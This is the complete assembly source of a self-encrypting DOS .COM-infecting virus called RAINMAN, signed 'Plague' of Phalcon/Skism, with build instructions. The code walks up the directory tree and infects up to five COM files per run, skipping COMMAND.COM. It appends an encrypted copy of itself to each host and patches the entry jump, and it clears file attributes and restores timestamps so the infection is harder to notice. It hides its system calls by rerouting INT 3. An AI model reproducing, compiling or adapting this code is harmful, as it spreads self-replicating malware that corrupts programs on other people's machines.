; File: RAINMAN.ASM
;     [RAINMAN] by Plague
                
                
        .model  tiny
        .code   
                
; Assemble with:
; TASM /m3 filename.ASM
; TLINK /t filename.OBJ
        org     0100h
                
carrier:
        db      0E9h,0,0                ; jmp start
                
start:
ENCRYPT:
patchstart:
        mov     bx, offset endencrypt
        mov     cx, (heap-endencrypt)/2+1
encrypt_loop:
        db      0081h                   ; add word ptr [bx], xxxx
xorpatch        db      0007h
encryptvalue    dw      0000h
        add     bx, 0002h
        loop    encrypt_loop
endencrypt:
        mov     bp, sp
        int     0003h
next:
        mov     bp, ss:[bp-6]
        sub     bp, offset next
                
        lea     dx, [bp+offset newDTA]
        mov     ah, 001Ah               ; Set DTA
        int     0021h
                
        mov     ah, 0047h               ; Get directory
        lea     si, [bp+offset origdir+1]
        mov     dl, 0000h               ; Default drive
        int     0021h
                
        push    ds
        push    es
                
        mov     ax, 3521h               ; get int 21h handler
        int     0021h
                
        push    es
        pop     ds
        xchg    bx, dx
        mov     ax, 2503h               ; set int 3 = int 21h handler
        int     0021h
                
        pop     es
        pop     ds
        mov     ax, 3524h
        int     0003h
        push    es
        push    bx
                
        mov     ax, 2524h
        lea     dx, [bp+INT24]          ; ASSumes ds=cs
        int     0003h
                
        push    cs
        pop     es
                
restore_COM:
        mov     di, 0100h
        push    di
        lea     si, [bp+offset old3]
        mov     cx, 0003h               ; Caution: far from the most efficient
        rep     movsb                   ; routine
                
        mov     byte ptr [bp+numinfect], 0000h
traverse_loop:
        lea     dx, [bp+offset COMmask]
        call    infect
        cmp     [bp+numinfect], 0005h
        jae     exit_traverse           ; exit if enough infected
                
        mov     ah, 003Bh               ; CHDIR
        lea     dx, [bp+offset dot_dot] ; go to previous dir
        int     0003h
        jnc     traverse_loop           ; loop if no error
                
exit_traverse:
                
        lea     si, [bp+offset origdir]
        mov     byte ptr [si], '\'
        mov     ah, 003Bh               ; restore directory
        xchg    dx, si
        int     0003h
                
        pop     dx
        pop     ds
        mov     ax, 2524h
        int     0003h
                
                
        mov     ah, 001Ah               ; restore DTA to default
        mov     dx, 0080h               ; in the PSP
        int     0003h
                
return:
        ret     
                
old3            db      0cdh,20h,0
                
INT24:
        mov     al, 0003h
        iret    
                
infect:
        mov     ah, 004Eh               ; find first
        mov     cx, 0007h               ; all files
findfirstnext:
        int     0003h
        jc      return
                
        cmp     word ptr [bp+newDTA+34], 'NA' ; Check if COMMAND.COM
        mov     ah, 004Fh               ; Set up find next
        jz      findfirstnext           ; Exit if so
                
        lea     dx, [bp+newDTA+30]
        mov     ax, 4300h
        int     0003h
        jc      return
        push    cx
        push    dx
                
        mov     ax, 4301h               ; clear file attributes
        push    ax                      ; save for later use
        xor     cx, cx
        int     0003h
                
        lea     dx, [bp+newDTA+30]
        mov     ax, 3D02h
        int     0003h
        xchg    ax, bx
                
        mov     ax, 5700h               ; get file time/date
        int     0003h
        push    cx
        push    dx
                
        lea     dx, [bp+offset readbuffer]
        mov     ah, 003Fh
        mov     cx, 001Ah
        int     0003h
                
        xor     cx, cx
        mov     ax, 4202h
        cwd     
        int     0003h
                
        cmp     word ptr [bp+offset readbuffer], 'ZM'
        jz      jmp_close
        mov     cx, word ptr [bp+offset readbuffer+1] ; jmp location
        add     cx, heap-start+3        ; convert to filesize
        cmp     ax, cx                  ; equal if already infected
        jl      skipp
jmp_close:
        jmp     close
skipp:
                
        cmp     ax, 65535-(endheap-start) ; check if too large
        ja      jmp_close               ; Exit if so
                
        lea     di, [bp+offset old3]
        lea     si, [bp+offset readbuffer]
        movsb   
        movsw   
                
        mov     si, ax                  ; save entry point
        add     si, 0100h
        sub     ax, 0003h
        mov     word ptr [bp+offset readbuffer+1], ax
        mov     dl, 00E9h
        mov     byte ptr [bp+offset readbuffer], dl
get_encrypt_value:
        mov     ah, 002Ch               ; Get current time
        int     0003h
                
        or      dx, dx                  ; Check if encryption value = 0
        jz      get_encrypt_value       ; Get another if it is
                
        add     si, (offset endencrypt-offset encrypt)
        mov     word ptr ds:[bp+patchstart+1], si
        mov     word ptr ds:[bp+encryptvalue], dx
                
        mov     cx, (heap-encrypt)/2
        lea     di, [bp+offset encryptbuffer]
        lea     si, [bp+offset ENCRYPT]
        push    si
        rep     movsw                   ; copy virus to buffer
                
        lea     ax, [bp+offset endencrypt-encrypt+encryptbuffer]
        mov     word ptr ds:[bp+patchstart+1], ax
        pop     si
        push    [bp+offset endencrypt]
        mov     byte ptr [bp+offset endencrypt], 00C3h ; retn
        xor     byte ptr [bp+offset xorpatch-encrypt+encryptbuffer], 0028h
        push    bx
        call    si                      ; encrypt virus in buffer
        pop     bx
        pop     word ptr [bp+offset endencrypt]
                
        xor     byte ptr [bp+offset xorpatch], 0028h
                
        mov     ah, 0040h
        mov     cx, heap-encrypt
        lea     dx, [bp+offset encryptbuffer]
        int     0003h
                
        xor     cx, cx
        mov     ax, 4200h
        xor     dx, dx
        int     0003h
                
                
        mov     ah, 0040h
        mov     cx, 0003h
        lea     dx, [bp+offset readbuffer]
        int     0003h
                
        inc     [bp+numinfect]
                
close:
        mov     ax, 5701h               ; restore file time/date
        pop     dx
        pop     cx
        int     0003h
                
        mov     ah, 003Eh
        int     0003h
                
        pop     ax                      ; restore file attributes
        pop     dx                      ; get filename and
        pop     cx                      ; attributes from stack
        int     0003h
                
        mov     ah, 004Fh               ; find next
        jmp     findfirstnext
                
signature       db      '[PS/G�]',0     ; Phalcon/Skism G�
creator         db      'Plague',0
virusname       db      '[RAINMAN]',0
COMmask         db      '*.COM',0
dot_dot         db      '..',0
                
heap:
encryptbuffer   db      (heap-encrypt)+1 dup (?)
newDTA          db      43 dup (?)
origdir         db      65 dup (?)
numinfect       db      ?
readbuffer      db      1ah dup (?)
endheap:
        end     carrier
        